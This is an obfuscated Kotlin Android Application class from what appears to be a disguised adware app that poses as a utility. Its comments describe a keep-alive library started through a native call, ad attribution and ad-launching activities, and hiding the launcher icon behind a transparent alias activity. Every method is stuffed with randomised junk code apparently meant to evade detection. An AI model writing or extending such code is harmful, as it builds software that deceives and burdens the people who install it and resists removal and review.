package lhky.dml.mie

import android.app.Application
import android.content.Intent
import android.os.Bundle
import lhky.dml.mie.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import lhky.yrec.qjuaj.base.APPContext
import lhky.yrec.qjuaj.base.OverseaAppHost
import lhky.yrec.qjuaj.base.OverseaAppInitializer
import lhky.yrec.qjuaj.ad.runtime.AdLifecycleInstaller


class FDVQ : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        @JvmStatic
        var insApp: FDVQ? = null
    }

    override fun onCreate() {
        val arr_VoXlfsrISYODOhRMOWY  = listOf("YvFYaooEi", "BmoRG", "VvjguGPpctZDhF").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_otSLwiMXcXw  = arr_VoXlfsrISYODOhRMOWY .filter { it.length > 57 }
         if (ad_otSLwiMXcXw .isNotEmpty() && java.lang.System.currentTimeMillis() < 67) {
             ad_otSLwiMXcXw .forEach { _ ->  }
         }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 统一安装广告生命周期监听，内部带幂等保护
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        val arr_KplmEAhY = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_iHPAhYYRXbAhMIs  = (arr_KplmEAhY  shl 46) xor (arr_KplmEAhY  shr 29)
         val j_gJPNJExhxfViqH  = i_iHPAhYYRXbAhMIs .inv() and 0xFFFF
         if (j_gJPNJExhxfViqH  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_BqftRGe")
         }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
           val MIjzxCawgdEQJn : Any = if (kotlin.random.Random.nextBoolean()) 49 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val MUNdFzKxydH  = (MIjzxCawgdEQJn  as? String)?.reversed() ?: "ipkASOmiLLLvpSAQ_280016346"

        if (MUNdFzKxydH  == "zQPLWcOjqFnr") {
            java.lang.System.out.print(MUNdFzKxydH )
        }
        YBVQ.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_ySYDCVpYGSTTYtH = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_XMlBmIzxY  = (arr_ySYDCVpYGSTTYtH  shl 5) xor (arr_ySYDCVpYGSTTYtH  shr 17)
         val j_TVXtYnNtnqxrt  = i_XMlBmIzxY .inv() and 0xFFFF
         if (j_TVXtYnNtnqxrt  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_nQCWMbqK")
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        val arr_GLUvxVPrRaRN = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_ErhqZlNTczXSOogB  = (arr_GLUvxVPrRaRN  shl 0) xor (arr_GLUvxVPrRaRN  shr 83)
         val j_dgepGTESprskhKme  = i_ErhqZlNTczXSOogB .inv() and 0xFFFF
         if (j_dgepGTESprskhKme  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_WGCPHTvzqzMrzr")
         }
        // 启动图标隐藏：禁用 CST 主入口，启用透明 MysteryAliasActivity
        startActivity(Intent(this, YBTX::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })

    }


    override fun initKeepPower(app: Application) {
        val arr_fFpMoFVqtITs  = listOf("CiBuKjYSuvo", "qxyQgqkQoszP", "DrClS").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_csZFWbvM  = arr_fFpMoFVqtITs .filter { it.length > 59 }
         if (ad_csZFWbvM .isNotEmpty() && java.lang.System.currentTimeMillis() < 26) {
             ad_csZFWbvM .forEach { _ ->  }
         }
        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
        NativeJniUtils.virinit(app)
    }

}